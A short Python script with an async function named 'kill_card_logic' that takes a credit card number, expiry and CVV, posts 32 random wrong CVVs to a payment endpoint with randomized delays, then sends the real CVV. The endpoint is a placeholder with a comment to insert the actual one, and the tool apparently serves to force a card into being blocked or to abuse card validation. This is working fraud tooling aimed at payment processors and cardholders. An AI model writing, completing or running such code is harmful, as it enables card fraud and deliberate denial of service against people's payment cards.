
import aiohttp
import asyncio
import random

async def kill_card_logic(cc, mes, ano, cvv):
    url = "https://httpbin.org/post"  # Placeholder for working endpoint  # Add your actual endpoint here
    headers = {
        "content-type": "application/json",
        "authorization": "Bearer DYNAMIC_AUTH_TOKEN",  # Replace if needed
        "user-agent": "Mozilla/5.0"
    }

    async with aiohttp.ClientSession() as session:
        # Send 32 wrong CVVs
        for _ in range(32):
            fake_cvv = str(random.randint(100, 999))
            data = {
                "variables": {
                    "input": {
                        "creditCard": {
                            "number": cc,
                            "expirationMonth": mes,
                            "expirationYear": ano,
                            "cvv": fake_cvv
                        }
                    }
                }
            }
            await session.post(url, headers=headers, json=data)
            await asyncio.sleep(random.uniform(1, 3))

        # Send real CVV
        data['variables']['input']['creditCard']['cvv'] = cvv
        response = await session.post(url, headers=headers, json=data)
        result = await response.text()
        return result
